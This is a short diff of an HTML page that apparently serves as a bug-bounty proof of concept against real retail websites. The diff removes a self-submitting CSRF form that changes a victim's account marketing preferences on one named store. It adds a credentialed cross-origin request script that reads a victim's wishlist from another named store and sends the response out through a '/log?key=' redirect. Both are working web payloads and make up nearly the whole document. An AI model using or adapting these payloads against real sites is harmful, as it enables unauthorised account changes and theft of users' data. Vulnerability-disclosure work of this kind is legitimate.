@@ -6,15 +6,16 @@
   <title>Document</title>
 </head>
 <body>
-   <h3>CSRF POC by Onepunchf</h3>
-      <form action="https://ae.loccitane.com/on/demandware.store/Sites-Loccitane_AE-Site/en_AE/Account-SavePreferences" method="post">
-      <input type="hidden" name="dwfrm_accountpreferences_optinlist_optinwhatsapp" value="true" />
-      <input type="hidden" name="dwfrm_accountpreferences_save" value="" />
-      <input type="submit" value="Submit request" />
-      </form>
-      <script>
-          history.pushState('', '', '/');
-          document.forms[0].submit();
-      </script>
+  <script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://www.globus-baumarkt.de/pixup/wishlist',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+</script>
 </body>
 </html>
